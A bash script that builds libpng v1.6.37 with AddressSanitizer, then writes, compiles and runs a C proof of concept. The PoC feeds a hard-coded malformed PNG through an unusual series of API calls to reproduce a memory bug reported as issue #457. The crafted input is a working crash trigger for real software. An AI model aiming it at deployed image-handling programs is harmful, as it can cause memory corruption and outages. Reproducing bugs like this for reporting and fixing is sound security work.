#!/usr/bin/env bash
set -euo pipefail

# ------------------------------------------------------------------
# run_poc.sh  –  Fully automated reproduction of libpng issue #457
# ------------------------------------------------------------------
# The script will:
#   1. Install build prerequisites (Debian/Ubuntu names)
#   2. Clone libpng, checkout v1.6.37 (buggy), build it with ASan
#   3. Drop a minimized PoC (fuzz457.c) next to the script
#   4. Compile the PoC against the freshly built ASan libpng
#   5. Execute the PoC, showing the AddressSanitizer back‑trace
# ------------------------------------------------------------------

ROOT_DIR=$(pwd)
LIBPNG_DIR="$ROOT_DIR/libpng-crash-poc"
INSTALL_DIR="$LIBPNG_DIR/asan"        
POC_SRC="$ROOT_DIR/fuzz457.c"
POC_BIN="$ROOT_DIR/fuzz457"

# 1. Dependencies ----------------------------------------------------
if command -v apt-get >/dev/null; then
  echo "[+] Ensuring build dependencies are present…"
  sudo apt-get update -qq
  sudo apt-get install -y clang make autoconf automake libtool pkg-config zlib1g-dev
fi

# 2. Clone + checkout vulnerable libpng -----------------------------
if [[ ! -d "$LIBPNG_DIR" ]]; then
  echo "[+] Cloning libpng…"
  git clone https://github.com/pnggroup/libpng.git "$LIBPNG_DIR"
fi
cd "$LIBPNG_DIR"
echo "[+] Checking out libpng v1.6.37…"
git fetch --tags >/dev/null
git checkout -q v1.6.37

# 3. Build libpng with AddressSanitizer -----------------------------
if [[ ! -d "$INSTALL_DIR/lib" ]]; then
  echo "[+] Building libpng with ASan…"
  export CC=clang
  export CFLAGS="-g -O0 -fsanitize=address -fno-omit-frame-pointer"
  ./configure --disable-shared --prefix="$INSTALL_DIR" >/dev/null
  make -j"$(nproc)" >/dev/null
  make install >/dev/null
else
  echo "[+] Reusing existing ASan‑built libpng in $INSTALL_DIR"
fi
cd "$ROOT_DIR"

# 4. PoC source -------------------------------------------------
cat > "$POC_SRC" << 'EOF'
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include "png.h"

static void dummy_free(struct png_struct_def *a, void *b) {}

int main(void)
{
    const uint8_t bytes[] = {
        137,'P','N','G','\r','\n',26,'\n',
        0,0,0,13,'I','H','D','R', 0,0,0,32, 0,0,0,32, 8,3,0,0,0, 68,164,138,198,
        0,0,0, 4,'g','A','M','A', 0,0,156,64, 32,13,228,203,
        0,0,0,15,'P','L','T','E', 102,204,204,255,255,255,0,0,0,51,153,102,153,255,204, 62,76,175,21,
        0,0,0,25,'t','E','X','t', 83,111,102,116,119,97,114,101,0,65,100,111,98,101,32,73,109,97,103,101,82,101,97,100,121, 113,201,101,60,
        0,0,0,91,'I','D','A','T', 56,203,221,147,65,10,128,64,12,3,51,205,254,255,205,30,84,216,69,219,122,241,160,115,205,64,32,180,6,65,16,5,32,98,228,40,16,49,148,226,159,10,0,149,112,172,155,10,128,61,27,87,193,150,192,105,197,158,23,194,89,83,8,75,126,47,76,121,34,52,75,186,17,150,33,223,169,248,236,201,201,57,241,228,121,27,54,210,102,3,53,127,203,12,109,
        0,0,0,0,'I','E','N','D', 174,66,96,130
    };

    /* write PNG to file */
    const char *fname = "fuzz.png";
    FILE *out = fopen(fname, "wb"); fwrite(bytes, sizeof bytes, 1, out); fclose(out);

    /* setup libpng and trigger the bug */
    FILE *in = fopen(fname, "rb");
    png_structp png = png_create_read_struct_2("1.6.37", NULL, NULL, NULL,
                                               NULL, NULL, NULL);
    if (!png) return 0;
    png_init_io(png, in);
    png_infop info = png_create_info_struct(png);
    png_set_mem_fn(png, NULL, NULL, dummy_free);
    png_set_benign_errors(png, -626394128);
    png_read_update_info(png, info);
    png_read_png(png, info, -1, NULL);
    png_read_info(png, info);
    return 0;
}

EOF

echo "[+] PoC source written to $POC_SRC"

# 5. Compile PoC -----------------------------------------------------
export LD_LIBRARY_PATH="$(clang --print-file-name=libclang_rt.asan-x86_64.so | xargs dirname):$INSTALL_DIR/lib"

echo "[+] Compiling PoC…"
clang -g -fsanitize=address -fno-omit-frame-pointer \
      "$POC_SRC" \
      -I"$INSTALL_DIR/include" \
      -L"$INSTALL_DIR/lib" -Wl,-Bstatic -lpng16 -Wl,-Bdynamic \
      -lz -lm -o "$POC_BIN"

# 6. Verify linkage --------------------------------------------------
ldd "$POC_BIN" | grep -E 'asan|png' || true

# 7. Run PoC ---------------------------------------------------------
echo -e "\n[+] Running $POC_BIN — you should see AddressSanitizer output below:\n"
"$POC_BIN" || true
